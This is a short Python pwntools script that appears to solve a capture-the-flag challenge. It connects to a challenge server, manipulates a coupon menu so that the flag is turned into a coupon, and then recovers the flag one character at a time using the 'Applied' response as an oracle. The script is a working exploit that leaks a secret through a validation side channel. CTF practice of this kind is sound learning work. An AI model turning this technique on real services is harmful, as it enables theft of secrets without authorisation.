#!/usr/bin/python3

from pwn import *

possibles_letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}{_'
loaves_len_value = 1
flag = ''

while loaves_len_value <= 37:

	io = remote("csa-2.csa-challenge.com", 2222)
	context.log_level = 'info'

	# Load Coupons
	io.recv()
	io.sendline(b'5')
	io.recv()
	io.sendline(b' ')
	io.recv()

	# Change Flag Length
	io.sendline(b'2')
	io.recv()
	io.sendline(b'2')
	io.recv()
	io.sendline(b'4')
	io.recv()
	io.sendline(str(loaves_len_value))
	io.recv()

	# Turn Flag Into Coupon
	io.sendline(b'2')
	io.recv()
	io.sendline(b'2')
	io.recv()
	io.sendline(b'3')
	io.recv()
	io.sendline(b'0')
	io.recv()
	io.sendline(b'2')
	io.recv()
	io.sendline(b'2')
	io.recv()

	for i in possibles_letters:
		# Check Coupon Letter
		io.sendline(b'5')
		io.recv()
		io.sendline(flag + i)
		print("Trying: " , flag + i)
		if b"Applied" in io.recv():
			loaves_len_value += 1
			flag = flag + i
			print(flag)
			break

	io.close()
